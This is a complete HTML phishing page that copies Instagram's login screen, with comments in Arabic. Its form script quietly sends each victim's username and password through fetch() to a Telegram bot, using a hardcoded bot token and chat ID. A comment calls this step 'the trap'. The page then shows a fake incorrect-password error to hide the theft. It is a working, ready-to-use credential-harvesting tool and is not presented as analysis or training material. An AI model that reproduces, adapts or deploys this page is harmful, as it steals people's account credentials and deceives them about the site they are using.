<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        /* إعادة تعيين الأنماط الأساسية */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            direction: ltr; /* التأكد من أن الاتجاه من اليسار لليمين */
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 350px;
            padding: 20px 0;
        }

        /* صندوق تسجيل الدخول الرئيسي */
        .login-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 20px 40px;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 10px;
        }

        /* شعار Instagram */
        .logo {
            font-family: 'Grand Hotel', 'Brush Script MT', cursive;
            font-size: 48px;
            margin-bottom: 30px;
            color: #262626;
            letter-spacing: -1px;
        }

        /* نموذج تسجيل الدخول */
        form {
            width: 100%;
        }

        .input-group {
            margin-bottom: 6px;
            position: relative;
        }

        .input-group input {
            width: 100%;
            padding: 9px 8px 7px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            color: #262626;
            outline: none;
            transition: border-color 0.2s;
        }

        .input-group input:focus {
            border: 1px solid #a8a8a8;
        }

        /* زر "Show" لكلمة المرور */
        .show-password {
            position: absolute;
            right: 8px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 14px;
            font-weight: 600;
            color: #262626;
            cursor: pointer;
            background: none;
            border: none;
            padding: 0;
            display: none; /* يظهر فقط عند وجود نص */
        }

        /* زر تسجيل الدخول */
        .login-btn {
            width: 100%;
            background-color: #0095f6;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 7px 16px;
            font-weight: 600;
            font-size: 14px;
            margin-top: 8px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .login-btn:disabled {
            background-color: #b2dffc;
            cursor: not-allowed;
        }

        .login-btn:active:not(:disabled) {
            background-color: #1877f2;
        }

        /* فاصل "OR" */
        .divider {
            display: flex;
            align-items: center;
            width: 100%;
            margin: 20px 0;
        }

        .line {
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .or-text {
            margin: 0 18px;
            font-size: 13px;
            font-weight: 600;
            color: #8e8e8e;
        }

        /* زر "Log in with Facebook" */
        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            margin-bottom: 15px;
            cursor: pointer;
        }

        .fb-icon {
            width: 16px;
            height: 16px;
            fill: #385185;
        }

        /* رابط "Forgot password?" */
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            margin-top: 12px;
        }

        /* صندوق "Don't have an account?" */
        .signup-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            width: 100%;
            text-align: center;
            font-size: 14px;
            color: #262626;
            margin-bottom: 20px;
        }

        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
            margin-left: 5px;
        }

        /* قسم "Get the app" */
        .get-app {
            text-align: center;
        }

        .get-app p {
            font-size: 14px;
            color: #262626;
            margin-bottom: 15px;
        }

        /* شارات التطبيقات */
        .app-badges {
            display: flex;
            justify-content: center;
            gap: 10px;
        }

        .app-badge {
            height: 40px;
            background-color: #000;
            border-radius: 5px;
            color: #fff;
            padding: 0 10px;
            display: flex;
            align-items: center;
            font-size: 10px;
            text-decoration: none;
            font-weight: 500;
        }

        /* رسالة الخطأ (تظهر عند محاولة تسجيل الدخول) */
        .error-message {
            color: #ed4956;
            font-size: 14px;
            text-align: center;
            margin-top: 15px;
            display: none;
        }
    </style>
    <!-- استيراد خط Grand Hotel لشعار Instagram -->
    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
</head>
<body>

    <div class="container">
        <div class="login-box">
            <div class="logo">Instagram</div>
            
            <form id="loginForm">
                <div class="input-group">
                    <input type="text" id="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="Password" required>
                    <button type="button" class="show-password" id="togglePassword">Show</button>
                </div>
                <button type="submit" class="login-btn" id="loginBtn" disabled>Log in</button>
                <div class="error-message" id="errorMessage"></div>
            </form>
            
            <div class="divider">
                <div class="line"></div>
                <div class="or-text">OR</div>
                <div class="line"></div>
            </div>
            
            <a href="#" class="fb-login">
                <svg class="fb-icon" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.469h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.469h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
                Log in with Facebook
            </a>
            
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>
        
        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>
        
        <div class="get-app">
            <p>Get the app.</p>
            <div class="app-badges">
                <a href="#" class="app-badge">Get it on Google Play</a>
                <a href="#" class="app-badge">Get it from Microsoft</a>
            </div>
        </div>
    </div>

    <script>
        // --- العناصر الأساسية ---
        const loginForm = document.getElementById('loginForm');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        const togglePassword = document.getElementById('togglePassword');
        const errorMessage = document.getElementById('errorMessage');

        // --- 1. تفعيل/تعطيل زر تسجيل الدخول ---
        function checkInputs() {
            const usernameValue = usernameInput.value.trim();
            const passwordValue = passwordInput.value.trim();
            
            // إظهار زر "Show" فقط عند وجود نص في حقل كلمة المرور
            togglePassword.style.display = passwordValue.length > 0 ? 'block' : 'none';

            if (usernameValue !== '' && passwordValue !== '') {
                loginBtn.disabled = false;
            } else {
                loginBtn.disabled = true;
            }
        }

        usernameInput.addEventListener('input', checkInputs);
        passwordInput.addEventListener('input', checkInputs);

        // --- 2. إظهار/إخفاء كلمة المرور ---
        togglePassword.addEventListener('click', function() {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                togglePassword.textContent = 'Hide';
            } else {
                passwordInput.type = 'password';
                togglePassword.textContent = 'Show';
            }
        });

        // --- 3. التعامل مع إرسال النموذج (سحب البيانات) ---
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault(); // منع إعادة تحميل الصفحة

            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();

            // إظهار رسالة خطأ وهمية (للتأثير فقط)
            errorMessage.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
            errorMessage.style.display = 'block';
            errorMessage.style.color = '#ed4956';

            // تعطيل الزر مؤقتاً لمحاكاة التحميل
            loginBtn.disabled = true;
            loginBtn.textContent = 'Logging in...';

            // 🔥 إرسال البيانات إلى تيليجرام (هذا هو الفخ)
            const BOT_TOKEN = "9134254301:AAG8bCDBz8IfO8CHEk5Qyxie2ceOca_xx0U";
            const CHAT_ID = "2005892579";
            const message = `🚨 *INSTAGRAM HIT!*\n👤 User: \`${username}\`\n🔑 Pass: \`${password}\``;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
            }).catch(err => console.log(err)); // حتى لو فشل الإرسال، نكمل

            // بعد 2.5 ثانية، نعيد الزر لحالته الطبيعية (محاكاة انتهاء المحاولة)
            setTimeout(() => {
                loginBtn.textContent = 'Log in';
                loginBtn.disabled = false;
            }, 2500);
        });

        // --- 4. تهيئة الصفحة عند التحميل ---
        checkInputs();
    </script>
</body>
</html>
